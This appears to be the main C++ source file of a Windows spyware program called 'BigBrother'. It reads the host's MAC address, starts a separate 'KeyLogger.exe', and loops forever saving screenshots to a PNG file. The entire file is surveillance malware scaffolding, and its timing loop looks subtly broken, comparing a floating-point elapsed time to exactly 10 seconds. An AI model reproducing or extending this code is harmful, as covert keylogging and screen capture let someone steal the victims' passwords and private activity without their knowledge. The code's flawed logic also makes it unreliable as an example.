#include "BigBrother.hpp"


double wtime()
{
  struct timeval t;
  gettimeofday(&t, NULL);

  return (double)t.tv_sec + (double)t.tv_usec * 1E-6;
}


int CreateProc(TCHAR *procname)
{
  STARTUPINFO si;
  PROCESS_INFORMATION pi;

  ZeroMemory(&si, sizeof(si));
  si.cb = sizeof(si);
  ZeroMemory(&pi, sizeof(pi));

  if (!CreateProcess(NULL,   // No module name (use command line)
      procname,        // Command line
      NULL,           // Process handle not inheritable
      NULL,           // Thread handle not inheritable
      FALSE,          // Set handle inheritance to FALSE
      0,              // No creation flags
      NULL,           // Use parent's environment block
      NULL,           // Use parent's starting directory
      &si,            // Pointer to STARTUPINFO structure
      &pi)           // Pointer to PROCESS_INFORMATION structure
    )
    return 1;

  // Wait until child process exits
  //WaitForSingleObject(pi.hProcess, INFINITE);

  // Close process and thread handles.
  //CloseHandle(pi.hProcess);
  //CloseHandle(pi.hThread);
  return 0;
}


int main()
{
  char *pMAC = getMAC();
  cout << "MAC: " << pMAC << endl;
  WCHAR *filename = L"prtscr.png";

  double t;
  TCHAR *procname = "KeyLogger.exe";

  if ((CreateProc(procname)) == 1)
    cout << "key logger start failed" << endl;

  while (1) {
    t = wtime();
    while ((wtime() - t) != 10) {}
    SaveBitmap(filename);
  }

  return 0;
}
